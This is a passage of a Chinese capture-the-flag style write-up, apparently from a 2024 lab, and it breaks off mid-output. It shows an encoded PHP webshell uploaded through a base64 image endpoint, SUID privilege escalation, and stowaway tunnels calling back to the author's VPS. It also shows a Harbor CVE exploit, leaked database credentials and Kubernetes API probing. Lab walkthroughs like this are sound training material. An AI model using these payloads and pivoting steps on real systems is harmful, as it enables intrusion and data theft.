+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">dir</span><br>229 Entering Extended Passive Mode (|||53964|)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.28.23.26:53964  ...  OK<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0         7536672 Mar 23  2024 OASystem.zip<br>get OASystem.zip<br></code></pre></td></tr></table></figure>
+<p>解压分析一下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Description: PhpStorm.</span><br><span class="hljs-comment"> * Author: yoby</span><br><span class="hljs-comment"> * DateTime: 2018/12/4 18:01</span><br><span class="hljs-comment"> * Email:logove<span class="hljs-doctag">@qq</span>.com</span><br><span class="hljs-comment"> * Copyright Yoby版权所有</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$img</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;imgbase64&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="hljs-variable">$img</span>, <span class="hljs-variable">$result</span>)) &#123;<br>    <span class="hljs-variable">$type</span> = <span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>) . <span class="hljs-string">&quot;-&quot;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$type</span>;<br>&#125;<br><span class="hljs-variable">$img</span> =  <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>));<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$img</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>根目录有<code>uploadbase64.php</code>，会匹配<code>data:image/&lt;input1&gt;;base64,&lt;input2&gt;</code>，以<code>&lt;input1&gt;</code>作为文件后缀，<code>base64_decode(&lt;input2&gt;）</code>作为文件内容写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /uploadbase64.php HTTP/1.1<br>Host: 172.28.23.26<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 76<br><br>imgbase64=data:image/php;<span class="hljs-built_in">base64</span>,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4=<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08143918.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2025-05-08 143918"></p>
+<p>写入命令发现<img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08144047.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2025-05-08 144047">回显是ret=127</p>
+<p>尝试蚁剑插件提权LD可以进行提权，修改一下<code>.antproxy.php</code>第31行的包含文件，加一个upload目录，然后把文件改一下，这里好像只支持GET的传参，在前端进行命令执行，为<code>www-data</code></p>
+<p>执行提权<code>find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</code></p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08145556.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2025-05-08 145556"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount<br>-rwsr-xr-x 1 root root 44680 May  8  2014 /bin/ping6<br>-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount<br>-rwsr-xr-x 1 root root 40128 Aug 31  2019 /bin/su<br>-rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping<br>-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount<br>-rwsr-xr-x 1 root root 71824 Aug 31  2019 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 39904 Aug 31  2019 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 75304 Aug 31  2019 /usr/bin/gpasswd<br>-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at<br>-rwsr-xr-- 1 root stapusr 173376 Apr  3  2016 /usr/bin/staprun<br>-rwsr-xr-x 1 root root 39664 Mar  3  2017 /usr/bin/base32<br>-rwsr-xr-x 1 root root 54256 Aug 31  2019 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 40432 Aug 31  2019 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 136808 Jan 21  2021 /usr/bin/sudo<br>-rwsr-xr-- 1 root messagebus 42992 Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 428240 May 27  2020 /usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 10104 Jan  2  2016 /usr/lib/s-nail/s-nail-privsep<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.28.23.26/upload/.antproxy.php?1=system(<span class="hljs-string">&quot;base32 /flag02.txt&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08145503.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2025-05-08 145503"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">56</span>d37734-<span class="hljs-number">5</span>f73-<span class="hljs-number">447</span>f-b1a5-a83f45549b28&#125;<br></code></pre></td></tr></table></figure>
+<p>看一下ifconfig的内容发现是有两个ip的，有二层</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19163656.png" srcset="/img/loading.gif" lazyload alt="2025-05-19163656"></p>
+<p>上传fscan扫一下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 172.22.14.0/24<br></code></pre></td></tr></table></figure>
+<p>扫到的主要内容是</p>
+<ul>
+<li>
+<p><strong>172.22.14.37</strong>（Linux）：</p>
+<ul>
+<li><strong>SSH（22端口）</strong>：OpenSSH 7.6p1</li>
+<li><strong>2379端口</strong>（可能是 etcd）和 <strong>10250端口</strong>（可能是 Kubernetes API）</li>
+</ul>
+</li>
+<li>
+<p><strong>172.22.14.46</strong>（Linux）：</p>
+</li>
+<li>
+<p><strong>HTTP（80端口）</strong>：运行 <strong>Harbor</strong></p>
+</li>
+</ul>
+<p>需要二层代理转发</p>
+<h1 id="flag5"><a class="markdownIt-Anchor" href="#flag5"></a> flag5</h1>
+<p>frp我这里多层代理转发一直有问题，所以我换了stowaway</p>
+<p>在个人vps上执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 2223 -s 2223<br></code></pre></td></tr></table></figure>
+<p>在第一层也就是靶机入口处执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c 27.25.151.99:2223 -s 2223 --reconnect 8<br></code></pre></td></tr></table></figure>
+<p>在第二层也就是oa系统内部</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8<br></code></pre></td></tr></table></figure>
+<p>最后走个socks 6000端口一样打(确实方便好多)</p>
+<p>先针对172.22.14.46端口，打个cve<a target="_blank" rel="noopener" href="https://github.com/404tk/CVE-2022-46463/blob/main/harbor.py">CVE-2022-46463/harbor.py at main · 404tk/CVE-2022-46463</a></p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172043.png" srcset="/img/loading.gif" lazyload alt="2025-05-19172043"></p>
+<p>简单的查看了信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python harbor.py http://<span class="hljs-number">172.22</span>.<span class="hljs-number">14.46</span>/ <span class="hljs-literal">--dump</span> harbor/secret <span class="hljs-literal">--v2</span><br></code></pre></td></tr></table></figure>
+<p>里面存在一个run.sh还有一个flag文件，得到了flag5</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172357.png" srcset="/img/loading.gif" lazyload alt="2025-05-19172357"></p>
+<h1 id="flag6"><a class="markdownIt-Anchor" href="#flag6"></a> flag6</h1>
+<p>下载projectadmin镜像</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172548.png" srcset="/img/loading.gif" lazyload alt="2025-05-19172548"></p>
+<p><a target="_blank" rel="noopener" href="http://xn--run-7j2ei60h28s.sh">查看到run.sh</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">sleep</span> 1<br><br><span class="hljs-comment"># start</span><br>java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar<br>/usr/bin/tail -f /dev/null<br></code></pre></td></tr></table></figure>
+<p>找到<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>然后反编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> unpacked<br><span class="hljs-built_in">cd</span> unpacked<br>jar -xf ../ProjectAdmin-0.0.1-SNAPSHOT.jar<br></code></pre></td></tr></table></figure>
+<p>可以得到数据库的信息</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19173211.png" srcset="/img/loading.gif" lazyload alt="2025-05-19173211"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC<br>spring.datasource.username=root<br>spring.datasource.password=My3q1i4oZkJm3<br>spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver<br><br>mybatis.type-aliases-package=com.smartlink.projectadmin.entity<br>mybatis.mapper-locations=classpath:mybatis/mapper/*.xml<br></code></pre></td></tr></table></figure>
+<p>直接用用MDUT进行UDF提权拿到flag6</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19173405.png" srcset="/img/loading.gif" lazyload alt="2025-05-19173405"></p>
+<h1 id="flag4"><a class="markdownIt-Anchor" href="#flag4"></a> flag4</h1>
+<p>之后对172.22.14.37进行扫描，先上传</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span> -h <span class="hljs-number">172.22.14.37</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell">D:\ONE<span class="hljs-literal">-FOX</span>集成工具箱_V8.<span class="hljs-number">2</span>公开版_by狐狸\gui_scan\fscan&gt;fscan <span class="hljs-literal">-h</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">14.37</span> <span class="hljs-literal">-p</span> <span class="hljs-number">1</span><span class="hljs-literal">-65535</span><br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2025-05-19 16:53:10] [INFO] 暴力破解线程数: 1</span><br><span class="hljs-string">[2025-05-19 16:53:11] [INFO] 开始信息扫描</span><br><span class="hljs-string">[2025-05-19 16:53:11] [INFO] 最终有效主机数量: 1</span><br><span class="hljs-string">[2025-05-19 16:53:11] [INFO] 开始主机扫描</span><br><span class="hljs-string">[2025-05-19 16:53:11] [INFO] 有效端口数量: 65535</span><br><span class="hljs-string">[2025-05-19 16:53:11] [SUCCESS] 端口开放 172.22.14.37:22</span><br><span class="hljs-string">[2025-05-19 16:53:11] [SUCCESS] 服务识别 172.22.14.37:22 =&gt; [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]</span><br><span class="hljs-string">[2025-05-19 16:54:39] [SUCCESS] 端口开放 172.22.14.37:2380</span><br><span class="hljs-string">[2025-05-19 16:54:39] [SUCCESS] 端口开放 172.22.14.37:2379</span><br><span class="hljs-string">[2025-05-19 16:54:49] [SUCCESS] 服务识别 172.22.14.37:2380 =&gt;</span><br><span class="hljs-string">[2025-05-19 16:54:54] [SUCCESS] 服务识别 172.22.14.37:2379 =&gt;</span><br><span class="hljs-string">[2025-05-19 16:57:10] [SUCCESS] 端口开放 172.22.14.37:6443</span><br><span class="hljs-string">[2025-05-19 16:58:05] [SUCCESS] 服务识别 172.22.14.37:6443 =&gt;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p>存在 Kubernetes API server 未授权</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19165635.png" srcset="/img/loading.gif" lazyload alt="2025-05-19165635"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;paths&quot;:</span> [<br>    <span class="hljs-string">&quot;/api&quot;</span>,<br>    <span class="hljs-string">&quot;/api/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/admissionregistration.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/admissionregistration.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/admissionregistration.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiextensions.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiextensions.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiextensions.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiregistration.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiregistration.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apiregistration.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apps&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/apps/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authentication.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authentication.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authentication.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authorization.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authorization.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/authorization.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/autoscaling&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/autoscaling/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/autoscaling/v2beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/autoscaling/v2beta2&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/batch&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/batch/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/batch/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/certificates.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/certificates.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/coordination.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/coordination.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/coordination.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/events.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/events.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/extensions&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/extensions/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/networking.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/networking.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/networking.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/node.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/node.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/policy&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/policy/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/rbac.authorization.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/rbac.authorization.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/rbac.authorization.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/scheduling.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/scheduling.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/scheduling.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/storage.k8s.io&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/storage.k8s.io/v1&quot;</span>,<br>    <span class="hljs-string">&quot;/apis/storage.k8s.io/v1beta1&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/autoregister-completion&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/etcd&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/log&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/ping&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/apiservice-openapi-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/apiservice-registration-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/apiservice-status-available-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/bootstrap-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/ca-registration&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/crd-informer-synced&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/generic-apiserver-start-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/kube-apiserver-autoregistration&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/rbac/bootstrap-roles&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/start-apiextensions-controllers&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/start-apiextensions-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/start-kube-aggregator-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/healthz/poststarthook/start-kube-apiserver-admission-initializer&quot;</span>,<br>    <span class="hljs-string">&quot;/livez&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/autoregister-completion&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/etcd&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/log&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/ping&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/apiservice-openapi-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/apiservice-registration-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/apiservice-status-available-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/bootstrap-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/ca-registration&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/crd-informer-synced&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/generic-apiserver-start-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/kube-apiserver-autoregistration&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/rbac/bootstrap-roles&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/start-apiextensions-controllers&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/start-apiextensions-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/start-kube-aggregator-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/livez/poststarthook/start-kube-apiserver-admission-initializer&quot;</span>,<br>    <span class="hljs-string">&quot;/logs&quot;</span>,<br>    <span class="hljs-string">&quot;/metrics&quot;</span>,<br>    <span class="hljs-string">&quot;/openapi/v2&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/autoregister-completion&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/etcd&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/log&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/ping&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/apiservice-openapi-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/apiservice-registration-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/apiservice-status-available-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/bootstrap-controller&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/ca-registration&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/crd-informer-synced&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/generic-apiserver-start-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/kube-apiserver-autoregistration&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/rbac/bootstrap-roles&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/start-apiextensions-controllers&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/start-apiextensions-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/start-kube-aggregator-informers&quot;</span>,<br>    <span class="hljs-string">&quot;/readyz/poststarthook/start-kube-apiserver-admission-initializer&quot;</span>,<br>    <span 